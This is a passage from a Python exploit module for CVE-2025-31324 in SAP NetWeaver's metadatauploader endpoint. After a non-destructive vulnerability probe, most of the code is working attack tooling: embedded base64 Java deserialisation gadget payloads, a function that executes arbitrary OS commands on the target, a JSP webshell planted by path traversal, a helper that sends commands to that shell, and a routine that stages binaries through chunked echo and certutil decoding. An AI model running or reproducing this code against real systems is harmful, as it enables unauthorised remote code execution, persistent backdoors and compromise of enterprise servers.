    "cwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29t"
    "L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3Vu"
    "L29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7"
    "KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1B"
    "eGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFs"
    "L3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEAIUdhZGdldHMu"
    "amF2YSBmcm9tIElucHV0RmlsZU9iamVjdAwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0"
    "aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFu"
    "L2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFs"
    "aXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0"
    "RXhjZXB0aW9uAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ+AQAY"
    "amF2YS9pby9GaWxlT3V0cHV0U3RyZWFtBwAqAQ=="
)

_DROP_P2 = base64.b64decode(
    "CAAsAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWDAAKAC4KACsALwEAFnN1bi9taXNjL0JBU0U2NERl"
    "Y29kZXIHADEKADIAIgE="
)

_DROP_TAIL = base64.b64decode(
    "CAA0AQAZc3VuL21pc2MvQ2hhcmFjdGVyRGVjb2RlcgcANgEADGRlY29kZUJ1ZmZlcgEAFihMamF2"
    "YS9sYW5nL1N0cmluZzspW0IMADgAOQoANwA6AQAFd3JpdGUBAAUoW0IpVgwAPAA9CgArAD4BAAVj"
    "bG9zZQwAQAALCgArAEEBAA1TdGFja01hcFRhYmxlAQAmc3lzdGVtUGFja2FnZS9HZW5lcmF0ZWQy"
    "NzEzNDU3NzA4OTI3MDABAChMc3lzdGVtUGFja2FnZS9HZW5lcmF0ZWQyNzEzNDU3NzA4OTI3MDA7"
    "ACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAADMAAQABAAAABSq3AAGx"
    "AAAAAgANAAAACgACAAAA8AAEAPEADgAAAAwAAQAAAAUADwBFAAAAAQATABQAAgAMAAAAPwAAAAMA"
    "AAABsQAAAAIADQAAAAYAAQAAAPQADgAAACAAAwAAAAEADwBFAAAAAAABABUAFgABAAAAAQAXABgA"
    "AgAZAAAABAABABoAAQATABsAAgAMAAAASQAAAAQAAAABsQAAAAIADQAAAAYAAQAAAPcADgAAACoA"
    "BAAAAAEADwBFAAAAAAABABUAFgABAAAAAQAcAB0AAgAAAAEAHgAfAAMAGQAAAAQAAQAaAAgAKQAL"
    "AAEADAAAADkABAADAAAAJKcAAwFMuwArWRIttwAwTSy7ADJZtwAzEjW2ADu2AD8stgBCsQAAAAEA"
    "QwAAAAMAAQMAAgAgAAAAAgAhABEAAAAKAAEAAgAjABAACXVxAH4AXQAAAe3K/rq+AAAAMgAbCgAD"
    "ABUHABcHABgHABkBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFceZp7jxt"
    "RxgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJs"
    "ZVRhYmxlAQAEdGhpcwEAA0ZvbwEADElubmVyQ2xhc3NlcwEAJUx5c29zZXJpYWwvcGF5bG9hZHMv"
    "dXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQAhR2FkZ2V0cy5qYXZhIGZyb20gSW5wdXRG"
    "aWxlT2JqZWN0DAAKAAsHABoBACN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbwEA"
    "EGphdmEvbGFuZy9PYmplY3QBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAH3lzb3NlcmlhbC9wYXls"
    "b2Fkcy91dGlsL0dhZGdldHMAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAEAAQAKAAsAAQAM"
    "AAAAMwABAAEAAAAFKrcAAbEAAAACAA0AAAAKAAIAAADpAAQA6gAOAAAADAABAAAABQAPABIAAAAC"
    "ABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQABkdlbmVyMXB3AQB4c3EAfgAw/////3BzcQB+ADcA"
    "AQAAAXEAfgA9cQB+AEF0ABBvdXRwdXRQcm9wZXJ0aWVzc3EAfgBFdAAGT2JqZWN0cQB+AEhxAH4A"
    "SXEAfgBjcQB+AEpxAH4AY3EAfgBhc3IAO2NvbS5zYXAuc2RvLmltcGwub2JqZWN0cy5wcm9qZWN0"
    "aW9ucy5Qcm9qZWN0aW9uRGF0YVN0cmF0ZWd5ohoJKRSWqasCAAJMAAlfZGVsZWdhdGV0AD1MY29t"
    "L3NhcC9zZG8vaW1wbC9vYmplY3RzL3Byb2plY3Rpb25zL0RlbGVnYXRpbmdEYXRhU3RyYXRlZ3k7"
    "TAAPX29wZW5Qcm9wZXJ0aWVzcQB+ACV4cQB+ABsAAQAAcHEAfgAjc3IAO2NvbS5zYXAuc2RvLmlt"
    "cGwub2JqZWN0cy5wcm9qZWN0aW9ucy5EZWxlZ2F0aW5nRGF0YVN0cmF0ZWd52AWdx/hc9yQCAAJM"
    "ABNfY29udGV4dFByb2plY3Rpb25zcQB+ADhMAAVfbWFpbnEAfgAVeHEAfgAbAAEAAHBxAH4AI3Nx"
    "AH4ATQAAAAB3BAAAAAB4cQB+AB5weHEAfgAHc3EAfgAFP0AAAAAAAAx3CAAAABAAAAACcQB+AAhx"
    "AH4AF3EAfgAMcQB+AAt4cQB+AGx4eHA="
)

# serialVersionUID 4-byte pairs — the PoC swaps these when the server is 7.5.
_UID_74 = b"\xF4\x51\xDC\xAA\x00\xB6\xF0\xCC"
_UID_75 = b"\x9A\x92\x23\xB0\xE6\xC2\x4D\x1A"


# ---------------------------------------------------------------------------
# HTTP helpers
# ---------------------------------------------------------------------------

_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
       "AppleWebKit/537.36 (KHTML, like Gecko)")


def _build_url(host: str, port: int, use_https: bool) -> str:
    scheme = "https" if use_https else "http"
    if ":" in host and not host.startswith("["):
        host = f"[{host}]"
    return f"{scheme}://{host}:{port}/developmentserver/metadatauploader" \
           f"?CONTENTTYPE=MODEL&CLIENT=1"


def _post_octet_stream(url: str, body: bytes, timeout: float) -> tuple:
    """POST raw bytes, return (status, text, err). Ignores TLS errors."""
    req = urllib.request.Request(
        url, data=body, method="POST",
        headers={"Content-Type": "application/octet-stream",
                 "User-Agent": _UA})
    ctx = ssl._create_unverified_context()
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            return r.status, r.read().decode("latin1", errors="replace"), ""
    except urllib.error.HTTPError as e:
        try:
            body_text = e.read().decode("latin1", errors="replace")
        except Exception:
            body_text = ""
        return e.code, body_text, ""
    except (urllib.error.URLError, TimeoutError, OSError) as e:
        return 0, "", str(e)


def _zip_properties(payload: bytes) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(".properties", payload)
    return buf.getvalue()


def _random_filename(ext: str = ".jsp", length: int = 8) -> str:
    return "".join(random.choice(string.ascii_lowercase)
                   for _ in range(length)) + ext


# ---------------------------------------------------------------------------
# Scanner
# ---------------------------------------------------------------------------

def check_cve_2025_31324(host: str, port: int = 50000,
                          use_https: bool = False,
                          timeout: float = 10.0) -> dict:
    """Non-destructive probe for CVE-2025-31324.

    Sends a well-formed (but empty) zipped `.properties` upload.  A patched
    server either returns a plain 200 with no serialisation trail, or 404/401.
    An unpatched server attempts to deserialise the payload and leaks a
    Java-internals error message when the gadget is missing — that trail is
    the detection signal.

    Returns dict:
        vulnerable:   bool
        reachable:    bool       — the port answered HTTP at all
        http_status:  int
        evidence:     str        — short human-readable reason
        url:          str        — exact URL probed
    """
    url = _build_url(host, port, use_https)
    body = _zip_properties(b"")   # minimal valid zip, no gadget

    status, text, err = _post_octet_stream(url, body, timeout)

    result = {
        "vulnerable": False,
        "reachable":  False,
        "http_status": status,
        "evidence":   "",
        "url":        url,
    }

    if err and status == 0:
        result["evidence"] = f"network error: {err}"
        return result

    result["reachable"] = True
    text_low = (text or "").lower()

    # A patched / fixed server responds with 404 "not found" or 401/403.
    if status in (401, 403):
        result["evidence"] = f"authenticated endpoint (HTTP {status})"
        return result
    if status == 404:
        result["evidence"] = "endpoint not present (HTTP 404)"
        return result

    # Unpatched: the deserialiser kicks in even on empty/invalid payloads and
    # complains about Properties / Hashtable / readObject — that proves the
    # endpoint is exposing Java deserialisation.
    markers = [
        "getoutputproperties",                 # classic gadget trail
        "serialversionuid",                    # version mismatch leak
        "java.util.properties",
        "java.util.hashtable",
        "readobject",
        "metadatauploader",
        "visualcomposer",
    ]
    if any(m in text_low for m in markers):
        result["vulnerable"] = True
        hit = next(m for m in markers if m in text_low)
        result["evidence"] = f"deserialisation trail in response: '{hit}'"
        return result

    # HTTP 200 with empty / uninformative body on an unauth endpoint is still
    # suggestive but not conclusive — flag as potentially vulnerable.
    if status == 200:
        result["vulnerable"] = True
        result["evidence"] = "HTTP 200 on unauth metadatauploader (likely vulnerable)"
        return result

    result["evidence"] = f"HTTP {status} (inconclusive)"
    return result


# ---------------------------------------------------------------------------
# Exploit — command execution
# ---------------------------------------------------------------------------

def _build_cmd_payload(command: str, use_75_uid: bool = False) -> bytes:
    cmd_bytes = command.encode("utf-8")
    total = 1711 + len(cmd_bytes)
    payload = (
        _CMD_H1
        + total.to_bytes(2, "big")
        + _CMD_H2
        + len(cmd_bytes).to_bytes(2, "big")
        + cmd_bytes
        + _CMD_TAIL
    )
    if use_75_uid:
        payload = payload.replace(_UID_74, _UID_75)
    return payload


def _classify_exploit_response(status: int, text: str) -> dict:
    text_low = (text or "").lower()
    needs_75 = ("local class serialversionuid = -7308740002576184038"
                in text_low)
    ok = "cause - getter getoutputproperties" in text_low
    return {
        "success": ok,
        "needs_75_uid": needs_75,
        "http_status": status,
    }


def exploit_cve_2025_31324_command(host: str, port: int, command: str,
                                     use_https: bool = False,
                                     timeout: float = 15.0) -> dict:
    """Execute an OS command via CVE-2025-31324.

    The payload wraps a TemplatesImpl gadget that calls
    Runtime.getRuntime().exec(<command>) on the target.  Because the gadget
    uses Runtime.exec(String), the command is tokenised on spaces — callers
    on Windows should pass e.g. `cmd.exe /C whoami`, and on POSIX targets
    pass `/bin/sh -c "<...>"`.

    Returns dict:
        success, http_status, evidence, used_uid ('74' or '75'), url,
        output  (empty list — Runtime.exec output is not captured over HTTP;
                 see exploit_cve_2025_31324_dropshell for an interactive shell)
    """
    url = _build_url(host, port, use_https)
    result = {
        "success": False,
        "http_status": 0,
        "evidence": "",
        "used_uid": "74",
        "url": url,
        "output": [],   # no HTTP-side output for the command gadget
    }

    payload = _zip_properties(_build_cmd_payload(command, use_75_uid=False))
    status, text, err = _post_octet_stream(url, payload, timeout)
    if err and status == 0:
        result["evidence"] = f"network error: {err}"
        return result

    cls = _classify_exploit_response(status, text)
    result["http_status"] = status

    if cls["success"]:
        result["success"] = True
        result["evidence"] = "deserialisation executed (Templates gadget confirmed)"
        return result

    if cls["needs_75_uid"]:
        # 7.5 kernel — swap the UID and retry once.
        payload = _zip_properties(_build_cmd_payload(command, use_75_uid=True))
        status2, text2, err2 = _post_octet_stream(url, payload, timeout)
        result["http_status"] = status2
        result["used_uid"] = "75"
        if err2 and status2 == 0:
            result["evidence"] = f"network error on 7.5 retry: {err2}"
            return result
        cls2 = _classify_exploit_response(status2, text2)
        if cls2["success"]:
            result["success"] = True
            result["evidence"] = "deserialisation executed (7.5 UID)"
            return result
        result["evidence"] = (f"HTTP {status2} — no deserialisation trail "
                              f"on 7.5 retry")
        return result

    snippet = (text or "")[:200].replace("\n", " ")
    result["evidence"] = f"HTTP {status} — {snippet!r}"
    return result


# ---------------------------------------------------------------------------
# Exploit — drop JSP webshell
# ---------------------------------------------------------------------------

_JSP_WEBSHELL = """<%@ page import="java.util.*,java.io.*"%>
<%
if (request.getParameter("cmd") != null) {
    String[] cmdArray;
    if (System.getProperty("os.name").toLowerCase().contains("win")) {
        cmdArray = new String[] {"cmd.exe", "/c", request.getParameter("cmd")};
    } else {
        cmdArray = new String[] {"/bin/sh", "-c", request.getParameter("cmd")};
    }
    Process process = Runtime.getRuntime().exec(cmdArray);
    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
    String line;
    out.println("<pre>");
    while ((line = reader.readLine()) != null) { out.println(line); }
    BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
    while ((line = errorReader.readLine()) != null) { out.println(line); }
    out.println("</pre>");
}
%>"""


def _build_drop_payload(shell_name: str, jsp_b64: str) -> bytes:
    file_name = "../apps/sap.com/irj/servlet_jsp/irj/root/" + shell_name
    file_bytes = file_name.encode("utf-8")
    content_bytes = jsp_b64.encode("utf-8")
    total = 1847 + len(file_bytes) + len(content_bytes)
    return (
        _DROP_HEAD
        + total.to_bytes(2, "big")
        + _DROP_P1
        + len(file_bytes).to_bytes(2, "big")
        + file_bytes
        + _DROP_P2
        + len(content_bytes).to_bytes(2, "big")
        + content_bytes
        + _DROP_TAIL
    )


def exploit_cve_2025_31324_dropshell(host: str, port: int,
                                       use_https: bool = False,
                                       shell_name: Optional[str] = None,
                                       timeout: float = 15.0) -> dict:
    """Drop a JSP webshell at `/irj/<random>.jsp` on the target.

    The shell executes `?cmd=<os-command>` and returns stdout+stderr inside
    a `<pre>` block.  Returns dict:
        success, http_status, shell_name, shell_url, evidence, used_uid
    """
    if not shell_name:
        shell_name = _random_filename()
    jsp_b64 = base64.b64encode(_JSP_WEBSHELL.encode()).decode()

    url = _build_url(host, port, use_https)
    scheme = "https" if use_https else "http"
    shell_url = f"{scheme}://{host}:{port}/irj/{shell_name}"

    result = {
        "success":     False,
        "http_status": 0,
        "shell_name":  shell_name,
        "shell_url":   shell_url,
        "evidence":    "",
        "used_uid":    "74",
        "url":         url,
    }

    payload = _zip_properties(_build_drop_payload(shell_name, jsp_b64))
    status, text, err = _post_octet_stream(url, payload, timeout)
    if err and status == 0:
        result["evidence"] = f"network error: {err}"
        return result

    cls = _classify_exploit_response(status, text)
    result["http_status"] = status

    if cls["success"]:
        result["success"] = True
        result["evidence"] = "deserialisation executed (Templates gadget confirmed)"
        return result

    if cls["needs_75_uid"]:
        raw = _build_drop_payload(shell_name, jsp_b64).replace(_UID_74, _UID_75)
        payload2 = _zip_properties(raw)
        status2, text2, err2 = _post_octet_stream(url, payload2, timeout)
        result["http_status"] = status2
        result["used_uid"] = "75"
        if err2 and status2 == 0:
            result["evidence"] = f"network error on 7.5 retry: {err2}"
            return result
        cls2 = _classify_exploit_response(status2, text2)
        if cls2["success"]:
            result["success"] = True
            result["evidence"] = "deserialisation executed (7.5 UID)"
            return result
        result["evidence"] = (f"HTTP {status2} — no deserialisation trail "
                              f"on 7.5 retry")
        return result

    snippet = (text or "")[:200].replace("\n", " ")
    result["evidence"] = f"HTTP {status} — {snippet!r}"
    return result


def write_file_via_shell(shell_url: str, target_path: str,
                          content: bytes, chunk_size: int = 3000,
                          timeout: float = 20.0) -> dict:
    """Write a binary file to the target via a dropped JSP shell.

    Chunks the content as base64 across multiple `cmd.exe /C echo >> file`
    calls so we never exceed Windows' 8191-character cmd.exe command-line
    limit.  Finishes with `certutil -decode` into the target path.

    Returns dict {success, error, chunks_written}.
    """
    import base64 as _b64
    b64 = _b64.b64encode(content).decode("ascii")
    tmp = r"%TEMP%\sapmap_w.b64"
    # Reset any stale tmp file from a previous run.
    run_dropshell_command(shell_url, f'cmd.exe /C del /q "{tmp}" 2>nul',
                           timeout=timeout)
    chunks = 0
    for i in range(0, len(b64), chunk_size):
        chunk = b64[i:i + chunk_size]
        op = ">" if i == 0 else ">>"
        r = run_dropshell_command(
            shell_url,
            f'cmd.exe /C echo {chunk}{op}"{tmp}"',
            timeout=timeout)
        if not r.get("success"):
            return {"success": False,
                    "error": f"chunk {chunks+1} write failed: {r.get('error','?')}",
                    "chunks_written": chunks}
        chunks += 1
    dec = run_dropshell_command(
        shell_url,
        f'cmd.exe /C certutil.exe -decode "{tmp}" "{target_path}"',
        timeout=timeout)
    # Cleanup best-effort
    run_dropshell_command(shell_url, f'cmd.exe /C del /q "{tmp}" 2>nul',
                           timeout=timeout)
    out_text = " ".join(dec.get("output") or [])
    if "FAILED" in out_text or ("ERROR" in out_text.upper()
                                 and "certutil" in out_text.lower()):
        return {"success": False,
                "error": f"certutil decode failed: {out_text[:200]}",
                "chunks_written": chunks}
    return {"success": True, "error": "", "chunks_written": chunks}


def run_dropshell_command(shell_url: str, command: str,
                           timeout: float = 20.0) -> dict:
    """Execute a single command via a previously-dropped JSP webshell.

    Parses the `<pre>...</pre>` block and returns `{success, output, error}`.

    Short commands go as GET query strings; longer ones are sent as POST
    form bodies to avoid URL-length limits (the J2EE HTTP stack rejects
    URLs over ~8 KB with HTTP 400).
    """
    import urllib.parse as _up
    ctx = ssl._create_unverified_context()
    # Threshold below the typical J2EE URL limit, with headroom for
    # url-encoding expansion of special chars.
    if len(command) < 3000:
        url = shell_url + "?cmd=" + _up.quote(command)
        req = urllib.request.Request(url, headers={"User-Agent": _UA})
    else:
        data = _up.urlencode({"cmd": command}).encode("ascii")
        req = urllib.request.Request(shell_url, data=data,
                                       headers={
                                           "User-Agent": _UA,
                                           "Content-Type":
                                               "application/x-www-form-urlencoded"
                                       })
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            text = r.read().decode("latin1", errors="replace")
    except urllib.error.HTTPError as e:
        try:
            text = e.read().decode("latin1", errors="replace")
        except Exception:
            text = ""
        if e.code != 200:
            return {"success": False, "output": [], "error":
                    f"HTTP {e.code}"}
    except (urllib.error.URLError, TimeoutError, OSError) as e:
        return {"success": False, "output": [], "error": str(e)}

    start = text.lower().find("<pre>")
    end = text.lower().find("</pre>")
    if start >= 0 and end > start:
        body = text[start + 5:end]
    else:
        body = text
    lines = [ln.rstrip() for ln in body.splitlines() if ln.strip()]
    return {"success": True, "output": lines, "error": ""}
